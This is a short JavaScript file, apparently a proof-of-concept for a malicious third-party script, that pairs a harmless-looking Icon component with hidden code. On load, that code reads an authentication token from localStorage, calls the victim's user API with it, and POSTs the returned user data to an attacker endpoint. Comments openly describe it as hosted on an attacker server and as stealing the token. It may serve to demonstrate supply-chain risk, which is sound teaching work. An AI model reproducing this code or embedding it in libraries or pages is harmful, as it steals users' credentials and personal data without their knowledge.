// icons.js — hosted on attacker server
// Legit-looking Icon component
function Icon({ name = 'star', size = 24, color = '#333' }) {
  const icons = {
    star: '★',
    heart: '♥',
    check: '✔',
    alert: '⚠',
  };

  const symbol = icons[name] || '❔';

  const span = document.createElement('span');
  span.textContent = symbol;
  span.style.fontSize = size + 'px';
  span.style.color = color;
  span.style.margin = '0 4px';

  return span;
}


window.Icon = Icon;

// Getting the token authentication and sending it to the attacker's server
(async function stealToken() {
  const token = localStorage.getItem('token');
  if (!token) {
    setTimeout(stealToken, 1000); // Try again in 1s
    return;
  }
  const headers = {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json' // Optional, if you need to set the Content-Type
  };
  userData = null
  try {
    // Making the request to the victim's server with the stolen token from his own frontend server
    const response = await fetch('http://localhost:4000/api/user', { 
      method: 'GET', 
      headers: headers 
    });
  
    if (!response.ok) {
      throw new Error(`Failed to fetch user info: ${response.status}`);
    }
  
    userData = await response.json();
    console.log(`User Info:`, userData);
  
  } catch (err) {
    console.log(`Failed to get /api/user:`, err.message);
  }
  
  fetch('http://localhost:9000/stolen', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      source: location.origin,
      data : userData,
    }),
  }).catch(console.error);

})();